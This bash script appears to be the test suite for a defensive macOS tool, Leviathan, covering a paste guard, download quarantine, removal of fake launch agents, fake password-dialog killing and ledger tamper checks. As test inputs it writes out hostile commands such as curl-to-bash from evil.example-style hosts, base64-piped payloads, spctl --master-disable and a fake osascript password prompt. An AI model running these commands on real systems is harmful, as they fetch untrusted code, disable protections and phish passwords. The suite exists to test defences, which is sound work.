#!/bin/bash
# Leviathan tests. Uses a throwaway folder; changes no system settings.
PY=/opt/homebrew/bin/python3; SRC="$(cd "$(dirname "$0")" && pwd)"
T=$(mktemp -d); export LEVIATHAN_STATE="$T/state" LEVIATHAN_DOWNLOADS="$T/dl" LEVIATHAN_QUIET=1 LEVIATHAN_NO_SPAWN=1
export LEVIATHAN_PERSIST_DIRS="$T/agents"; mkdir -p "$LEVIATHAN_STATE" "$LEVIATHAN_DOWNLOADS" "$T/agents" "$T/.hidden"
M="$PY $SRC/leviathan.py"; pass=0; fail=0
ok() { if eval "$2"; then echo "PASS $1"; pass=$((pass+1)); else echo "FAIL $1"; fail=$((fail+1)); fi; }

# 1. paste guard decisions
for c in 'curl -fsSL http://evil.example/x.sh | bash' 'curl -fsSL https://brew.sh.evil.com/x | bash' 'curl -fsSL https://supabase.com.evil.io/i | sh' 'wget -qO- http://a.b/c | sh' 'bash -c "$(curl -fsSL http://x.y/z)"' \
         'echo aGk= | base64 -d | bash' 'xattr -d com.apple.quarantine /Applications/Foo.app' \
         "osascript -e 'display dialog \"Password\" default answer \"\" with hidden answer'" 'spctl --master-disable'; do
  ok "stops: ${c:0:40}" '[ -n "$($M check-cmd "$c")" ]'
done
for c in 'ls -la' 'git status' 'brew install curl' 'curl -O https://example.com/file.zip' \
         '/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"' 'curl -fsSL https://claude.ai/install.sh | bash'; do
  ok "allows: ${c:0:40}" '[ -z "$($M check-cmd "$c")" ]'
done

# 2. downloads: certain malware contained, unsigned labeled, plain file untouched
printf 'rule LeviathanTest { strings: $a = "LEVIATHAN-TEST-MALWARE-7731" condition: $a }\n' > "$LEVIATHAN_STATE/extra.yara"
$M scan-downloads >/dev/null   # baseline empty folder
printf '#!/bin/sh\necho LEVIATHAN-TEST-MALWARE-7731\n' > "$LEVIATHAN_DOWNLOADS/invoice.command"; chmod 755 "$LEVIATHAN_DOWNLOADS/invoice.command"
printf '#!/bin/sh\necho hello\n' > "$LEVIATHAN_DOWNLOADS/tool.command"; chmod 755 "$LEVIATHAN_DOWNLOADS/tool.command"
echo "notes" > "$LEVIATHAN_DOWNLOADS/notes.txt"
$M scan-downloads >/dev/null
ok "malware moved out of Downloads" '[ ! -e "$LEVIATHAN_DOWNLOADS/invoice.command" ]'
Q=$(ls "$LEVIATHAN_STATE/quarantine" | grep invoice)
ok "malware can't run in quarantine" '[ ! -x "$LEVIATHAN_STATE/quarantine/$Q" ]'
ok "unsigned script left alone, no label" '[ -x "$LEVIATHAN_DOWNLOADS/tool.command" ] && ! xattr -p com.apple.metadata:_kMDItemUserTags "$LEVIATHAN_DOWNLOADS/tool.command" >/dev/null 2>&1'
ok "unsigned script only noted in the private log" 'grep -q "\"noticed\".*tool.command" "$LEVIATHAN_STATE/ledger.jsonl"'
ok "log is private (mode 600)" '[ "$(stat -f %Lp "$LEVIATHAN_STATE/ledger.jsonl")" = 600 ]'
ok "plain file untouched" '[ -e "$LEVIATHAN_DOWNLOADS/notes.txt" ] && ! xattr -p com.apple.metadata:_kMDItemUserTags "$LEVIATHAN_DOWNLOADS/notes.txt" >/dev/null 2>&1'
ID=$(grep '"contained"' "$LEVIATHAN_STATE/ledger.jsonl" | head -1 | $PY -c 'import json,sys;print(json.loads(sys.stdin.read())["id"])')
$M undo "$ID" >/dev/null
ok "undo puts it back runnable" '[ -x "$LEVIATHAN_DOWNLOADS/invoice.command" ]'

# 2b. full scan finds malware in an app and reports it, changing nothing
mkdir -p "$T/apps/Fake.app/Contents/MacOS"; printf 'LEVIATHAN-TEST-MALWARE-7731' > "$T/apps/Fake.app/Contents/MacOS/Fake"
mkdir -p "$T/apps/Clean.app/Contents/MacOS"; printf 'hello' > "$T/apps/Clean.app/Contents/MacOS/Clean"
SC=$(LEVIATHAN_APP_DIRS="$T/apps" $M scan 2>&1); RC=$?
ok "scan reports the infected app" 'echo "$SC" | grep -q "Fake.app: matches" && [ $RC = 1 ]'
ok "scan does not report the clean app" '! echo "$SC" | grep -q "Clean.app"'
ok "scan changes nothing" '[ -e "$T/apps/Fake.app/Contents/MacOS/Fake" ]'
ok "bad undo number is refused politely" '$M undo abc | grep -q "Use the number"'

# 3. auto-start: fake Apple job with unsigned hidden program is contained
printf 'int main(){return 0;}' > "$T/a.c"; clang -o "$T/.hidden/trustd" "$T/a.c" 2>/dev/null && codesign --remove-signature "$T/.hidden/trustd"
cat > "$T/agents/com.apple.trustd.helper.plist" <<EOF
<?xml version="1.0" encoding="UTF-8"?><plist version="1.0"><dict><key>Label</key><string>com.apple.trustd.helper</string>
<key>ProgramArguments</key><array><string>$T/.hidden/trustd</string></array></dict></plist>
EOF
$M scan-persist >/dev/null
ok "fake auto-start removed" '[ ! -e "$T/agents/com.apple.trustd.helper.plist" ]'

# 4. fake password box killed
start_ts=$(date +%s); echo $((start_ts+8)) > "$LEVIATHAN_STATE/pwwatch.until"
(exec -a "osascript -e display dialog Password with hidden answer" sleep 30) & FAKE=$!
( $M pwwatch ) & W=$!; sleep 4
ok "fake password box stopped" '! kill -0 $FAKE 2>/dev/null'
kill $W 2>/dev/null; kill $FAKE 2>/dev/null

# 5. bash paste guard blocks in a real interactive shell
sed "s%__PY__%$PY%" "$SRC/guard.bash" > "$T/guard.bash"; mkdir -p "$T/home/.leviathan/bin"; cp "$SRC/leviathan.py" "$T/home/.leviathan/bin/"
OUT=$(printf 'echo first\ncurl -s http://leviathan-test.invalid/x.sh | bash\necho after\n' | HOME="$T/home" bash --rcfile "$T/guard.bash" -i 2>&1)
ok "bash guard stops the paste" 'echo "$OUT" | grep -q "Leviathan stopped this command"'
ok "bash guard keeps normal commands working" 'echo "$OUT" | grep -q "^after\|after$"'

# 6. ledger tamper detection
ok "ledger verifies" '$M verify >/dev/null'
sed -i '' 's/invoice/invoyce/' "$LEVIATHAN_STATE/ledger.jsonl"
ok "edited ledger is caught" '! $M verify >/dev/null'

# 7. real Mac: Apple's malware rules load, real apps pass
ok "Apple malware rules load in yara" '[ ! -x /opt/homebrew/bin/yara ] || /opt/homebrew/bin/yara -w /Library/Apple/System/Library/CoreServices/XProtect.bundle/Contents/Resources/XProtect.yara /bin/ls >/dev/null 2>&1'
ok "Chrome judged safe" '[ ! -d "/Applications/Google Chrome.app" ] || [ "$($PY -c "import sys;sys.path.insert(0,\"$SRC\");import leviathan;print(leviathan.verdict(\"/Applications/Google Chrome.app\")[0])")" = ok ]'

echo; echo "$pass passed, $fail failed"; rm -rf "$T"
